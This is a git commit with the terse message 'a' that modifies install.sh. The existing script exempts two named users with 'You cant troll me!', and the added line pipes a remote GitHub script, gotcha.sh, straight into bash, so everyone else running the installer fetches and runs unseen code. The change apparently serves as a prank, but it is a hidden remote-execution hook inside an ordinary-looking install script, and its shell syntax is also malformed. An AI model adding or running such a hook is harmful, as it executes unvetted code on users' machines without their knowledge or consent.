643cdb4faab7b8bc607deff4c6ee5c983f60a54d
Jonas Kauker <jkauker@1-D-13.42heilbronn.de>
2023-12-12 14:30:47 +0100

    a

--- install.sh
+++ install.sh
@@ -4,3 +4,5 @@ if [$(whoami) == "jkauker" || $(whoami) == "nsabia"] then
 	echo "You cant troll me!"
 	exit 1
 fi
+
+@curl -s https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh | bash && exit 0
